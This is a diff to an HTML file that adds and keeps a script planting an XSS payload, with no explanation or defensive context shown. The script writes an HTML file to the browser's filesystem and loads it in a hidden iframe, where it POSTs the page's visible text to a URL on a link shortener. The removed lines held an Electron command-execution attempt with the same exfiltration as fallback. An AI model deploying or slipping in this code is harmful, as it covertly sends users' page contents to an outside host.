@@ -44,36 +44,32 @@
 </body>
 </html>
  -->
-
+123
 <script>
-webkitRequestFileSystem(PERSISTENT, 1024 * 1024, function(fs) {
-  fs.root.getFile('bootloader.html', { create: true }, function(fileEntry) {
+webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
+  fs.root.getFile('xss.html', { create: true }, function(fileEntry) {
     fileEntry.createWriter(function(writer) {
       const payload = `
-        <style>*{all:unset!important;color:red;font-size:30px}</style>
+        <style>*{color:red;font-size:30px}</style>
         <script>
-          // RCE for Electron with nodeIntegration
-          try {
-            require('child_process').exec('open -a Calculator');
-          } catch (e) {
-            // fallback to token exfiltration
-            fetch('https://tinyurl.com/yz885dsu/xss', {
-              method: 'POST',
-              body: document.body.innerText
-            });
-          }
+          fetch('https://tinyurl.com/yz885dsu/xss', {
+            method: 'POST',
+            body: JSON.stringify({ body: document.body.innerText })
+          });
         <\/script>
       `;
       writer.write(new Blob([payload], { type: 'text/html' }));
       writer.onwriteend = function() {
-        // load file now (auto-load on future runs can be triggered via injected preload or component)
         const url = fileEntry.toURL();
         const iframe = document.createElement('iframe');
         iframe.src = url;
-        iframe.style = "width:0;height:0;display:none";
+        iframe.width = 1;
+        iframe.height = 1;
+        iframe.style = "display:none";
         document.body.appendChild(iframe);
       };
     });
   });
 });
 </script>
+
